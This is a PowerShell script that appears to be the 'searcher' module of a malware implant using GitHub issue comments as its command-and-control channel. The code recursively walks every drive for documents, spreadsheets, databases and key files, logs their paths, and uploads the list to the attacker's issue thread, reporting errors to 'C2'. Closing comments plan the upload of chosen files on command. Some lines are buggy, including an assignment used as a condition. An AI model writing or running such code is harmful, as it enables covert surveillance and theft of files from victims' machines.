#ENTRY POINT
#Write startup message to console
Write-Console -Body ("Searcher starting.") -IssueNumber $issueNumber
Write-Host "DEBUG: Searcher starting."

#Check if searcher log exists; if not, create it.
$searcherLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\searcher.log"
try
{
    If([System.IO.File]::Exists($searcherLogPath))
    {
        Write-Console -Body ("Searcher log found OK.") -IssueNumber $issueNumber
        Write-Host "DEBUG: Searcher log found OK."
    }
    Else
    {
        Write-Console -Body ("Searcher log not found. Attempting to create it...") -IssueNumber $issueNumber
        Write-Host "DEBUG: Searcher log not found. Attempting to create it..."

        #Make sure there is at least one entry in the searcher log even if no files with the below specified criteria are found
        Add-Content -Path $searcherLogPath -Value "BEGIN SEARCHER LOG"

        #Search for files with the below extensions and add them to the searcher log. This will take some time if the drives are slow and/or there's a lot of files.
        $extensions = @("csv","db","dbf","mdb","key","odp","pps","ppt","pptx","ods","xlr","xls","xlsx","xlsm","doc","docx","docm","odt","pdf","tex","wks","wps","wpd")
        $fileList = New-Object System.Collections.Generic.List[System.Object]

        #Get all logical drives
        $drives = (Get-PSDrive | Select-Object -ExpandProperty 'Name' | Select-String -Pattern '^[a-z]$')
        
        ForEach($drive in $drives)
        {
            $drive = ($drive | Out-String).Trim()
            $files = Get-ChildItem -Path ($drive + ":\") -Recurse -File -Name
            ForEach($file in $files)
            {
                #Turn the file object into a string, and trim the whitespace
                $file = ($file | Out-String).Trim()

                ForEach($extension in $extensions)
                {
                    If($file -like ("*." + $extension))
                    {
                        $fileList.Add($drive + ":\" + $file)
                        Write-Host "DEBUG: Searcher added file " + $file + " to the log based on like match with " + $extension
                        break
                    }
                }
            }
            Write-Console -Body ("Searcher completed searching the " + $drive + " drive.") -IssueNumber $issueNumber
            Write-Host "DEBUG: Searcher completed searching the " + $drive + " drive."
        }
        $fileArray = $fileList.ToArray()
        Add-Content -Path $searcherLogPath -Value $fileArray

        #Confirm that the searcher file was created OK.
        If(!([System.IO.File]::Exists($searcherLogPath)))
        {
            Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Attempted to create the searcher log, but was unable to do so. Exiting.")
		    Write-Console -Body "Attempted to create the searcher log, but was unable to do so. Exiting." -IssueNumber $issueNumber
		    Write-Host "DEBUG: Attempted to create the searcher log, but was unable to do so. Exiting."; Start-Sleep -s 600
		    Exit
        }
    }
}
catch
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to find and/or create the searcher log. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to find and/or create the searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to find and/or create the searcher log. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#Get all the comments for this agent. The default sort has least recent comments first, so we need to reverse that to loop through the most recent comments first
try 
{
    $comments = Get-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNumber
    [array]::Reverse($comments)
    Write-Console -Body ("Searcher downloaded the comments for this agent.") -IssueNumber $issueNumber
    Write-Host "DEBUG: Searcher downloaded the comments for this agent."
}
catch 
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to get comments with searcher. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to get comments with searcher. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to get comments with searcher. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#Loop through comments to find the ID of the most recent searcher log upload if it exists. If it doesn't exist, $mostRecentSearcherLogID will remain 0.
$mostRecentSearcherLogID = 0
try 
{
    ForEach($comment in $comments)
    {
        If($comment.body -like "PKG{SEARCHER}:*")
        {
            $bodyText = ($comment.body).replace("PKG{SEARCHER}:","")
            $bodyText = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($bodyText))
            If($bodyText -like "BEGIN SEARCHER LOG*")
            {
                $mostRecentSearcherLogID = $comment.ID
                Write-Console -Body ("Identified comment ID " + $mostRecentSearcherLogID + " as the most recent searcher log upload.") -IssueNumber $issueNumber
                Write-Host "DEBUG: Identified comment ID " + $mostRecentSearcherLogID + " as the most recent searcher log upload."
                break
            }
        }
    }
}
catch 
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to identify the most recent searcher log upload. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to identify the most recent searcher log upload. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to identify the most recent searcher log upload. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#Check if we found the searcher log above. If $mostRecentSearcherLogID = 0, that means we didn't. In that eventuality, upload it.
try 
{
    If($mostRecentSearcherLogID = 0)
    {
        Write-Console -Body ("Couldn't identify a searcher log associated with this agent. Uploading...") -IssueNumber $issueNumber
        Write-Host "DEBUG: Couldn't identify a searcher log associated with this agent. Uploading..."
        Send-PackageMessage -Package "SEARCHER" -IssueNumber $issueNumber -Body (Get-Content -Path $searcherLogPath -Raw)
        Write-Console -Body ("Uploaded complete.") -IssueNumber $issueNumber
        Write-Host "DEBUG: Upload complete."
    }
}
catch 
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload a new searcher log. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to upload a new searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to upload a new searcher log. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#If command is to upload a particular file, for each file:
    #check if that file still exists
    #If yes, upload it

    #Use comment ID to determine if it's newer than the latest searcher log. Maybe delete executed commands?

#If command is to refresh the log, do so, upload it.

#Send searcher confirmation message
#Exit
